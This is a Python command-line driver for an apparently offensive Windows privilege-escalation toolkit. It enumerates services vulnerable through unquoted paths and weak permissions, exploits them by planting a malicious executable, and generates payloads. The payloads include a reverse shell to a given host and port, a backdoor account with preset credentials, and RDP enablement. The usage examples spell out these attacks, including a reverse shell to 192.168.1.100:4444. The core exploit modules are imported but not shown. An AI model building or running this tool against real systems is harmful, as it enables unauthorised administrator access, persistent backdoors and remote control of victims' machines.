import argparse
import sys
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent))

from core.enumerator import ServiceEnumerator
from exploits.unquoted_path import UnquotedPathExploit
from exploits.weak_permissions import WeakPermissionsExploit
from payloads.generator import PayloadGenerator
from utils.helpers import print_banner, print_status, check_admin


def enumerate_all(output_dir: str):
    """Run full enumeration of all vulnerable services."""
    print("\n" + "=" * 60)
    print("FULL SERVICE VULNERABILITY ENUMERATION")
    print("=" * 60)

    # Unquoted paths
    print("\n[PHASE 1] Unquoted Service Paths")
    print("-" * 40)
    unquoted = UnquotedPathExploit(output_dir)
    unquoted_results = unquoted.enumerate()

    # Weak permissions
    print("\n[PHASE 2] Weak Service Permissions")
    print("-" * 40)
    weak = WeakPermissionsExploit(output_dir)
    weak_results = weak.enumerate()

    # Summary
    print("\n" + "=" * 60)
    print("ENUMERATION SUMMARY")
    print("=" * 60)
    print(f"\n[+] Unquoted path vulnerabilities: {len(unquoted_results)}")
    print(f"[+] Weak permission vulnerabilities: {len(weak_results)}")
    print(f"[+] Total exploitable services: {len(unquoted_results) + len(weak_results)}")

    if unquoted_results:
        print("\n[*] Unquoted Path Services:")
        for svc in unquoted_results:
            print(f"    - {svc['name']}: {svc['path']}")

    if weak_results:
        print("\n[*] Weak Permission Services:")
        for svc in weak_results:
            print(f"    - {svc['name']}: {svc['vuln_type']}")


def main():
    parser = argparse.ArgumentParser(
        description="Service Exploitation Framework - Windows Privilege Escalation Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Enumerate all vulnerable services:
    python service_exploit.py --enumerate

  Find unquoted path services only:
    python service_exploit.py --enumerate-unquoted

  Exploit an unquoted path service:
    python service_exploit.py --exploit-unquoted "VulnService" --payload ./malicious.exe

  Generate a reverse shell payload:
    python service_exploit.py --generate reverse_shell --lhost 192.168.1.100 --lport 4444

  Generate an add-user payload:
    python service_exploit.py --generate add_user --username backdoor --password Secret123!
        """
    )

    # Enumeration options
    enum_group = parser.add_argument_group('Enumeration')
    enum_group.add_argument('--enumerate', action='store_true',
                            help='Enumerate all vulnerable services')
    enum_group.add_argument('--enumerate-unquoted', action='store_true',
                            help='Find unquoted service path vulnerabilities')
    enum_group.add_argument('--enumerate-weak', action='store_true',
                            help='Find weak service permission vulnerabilities')

    # Exploitation options
    exploit_group = parser.add_argument_group('Exploitation')
    exploit_group.add_argument('--exploit-unquoted', type=str, metavar='SERVICE',
                               help='Exploit unquoted path vulnerability')
    exploit_group.add_argument('--exploit-weak', type=str, metavar='SERVICE',
                               help='Exploit weak permission vulnerability')
    exploit_group.add_argument('--payload', type=str,
                               help='Path to malicious executable payload')
    exploit_group.add_argument('--target-path', type=str,
                               help='Target path for payload placement (unquoted path)')

    # Payload generation options
    payload_group = parser.add_argument_group('Payload Generation')
    payload_group.add_argument('--generate', type=str,
                               choices=['reverse_shell', 'add_user', 'enable_rdp'],
                               help='Generate malicious payload')
    payload_group.add_argument('--lhost', type=str,
                               help='LHOST for reverse shell')
    payload_group.add_argument('--lport', type=int,
                               help='LPORT for reverse shell')
    payload_group.add_argument('--username', type=str, default='hacker',
                               help='Username for add_user/enable_rdp payloads')
    payload_group.add_argument('--password', type=str, default='Password123!',
                               help='Password for new user')

    # General options
    general_group = parser.add_argument_group('General')
    general_group.add_argument('--output-dir', type=str, default='service_exploits',
                               help='Output directory for results and payloads')
    general_group.add_argument('--quiet', action='store_true',
                               help='Suppress banner and status output')

    args = parser.parse_args()

    # Show banner unless quiet
    if not args.quiet:
        print_banner()
        print_status()

    # Handle enumeration
    if args.enumerate:
        enumerate_all(args.output_dir)

    elif args.enumerate_unquoted:
        exploit = UnquotedPathExploit(args.output_dir)
        results = exploit.enumerate()

        if results:
            print(f"\n[+] Found {len(results)} vulnerable services")
            for svc in results:
                print(f"\n  Service: {svc['name']}")
                print(f"  Path: {svc['path']}")

                locations = exploit.find_exploitable_locations(svc['path'])
                if locations:
                    print(f"  Exploitable locations:")
                    for loc in locations:
                        print(f"    -> {loc['malicious_path']}")

    elif args.enumerate_weak:
        exploit = WeakPermissionsExploit(args.output_dir)
        results = exploit.enumerate()

        if results:
            print(f"\n[+] Found {len(results)} vulnerable services")
            for svc in results:
                print(f"\n  Service: {svc['name']}")
                print(f"  Binary: {svc['binary_path']}")
                print(f"  Vulnerability: {svc['vuln_type']}")
                print(f"  ACL: {svc['vulnerable_acl']}")

    # Handle exploitation
    elif args.exploit_unquoted:
        if not args.payload:
            print("[-] --payload required for exploitation")
            sys.exit(1)

        exploit = UnquotedPathExploit(args.output_dir)
        success = exploit.exploit(
            args.exploit_unquoted,
            args.payload,
            args.target_path
        )

        sys.exit(0 if success else 1)

    elif args.exploit_weak:
        if not args.payload:
            print("[-] --payload required for exploitation")
            sys.exit(1)

        exploit = WeakPermissionsExploit(args.output_dir)
        success = exploit.exploit(args.exploit_weak, args.payload)

        sys.exit(0 if success else 1)

    # Handle payload generation
    elif args.generate:
        generator = PayloadGenerator(args.output_dir)

        if args.generate == 'reverse_shell':
            if not args.lhost or not args.lport:
                print("[-] --lhost and --lport required for reverse_shell")
                sys.exit(1)

            generator.generate_reverse_shell(args.lhost, args.lport)

        elif args.generate == 'add_user':
            generator.generate_add_user(args.username, args.password)

        elif args.generate == 'enable_rdp':
            generator.generate_enable_rdp(args.username, args.password)

    else:
        parser.print_help()


if __name__ == "__main__":
    main()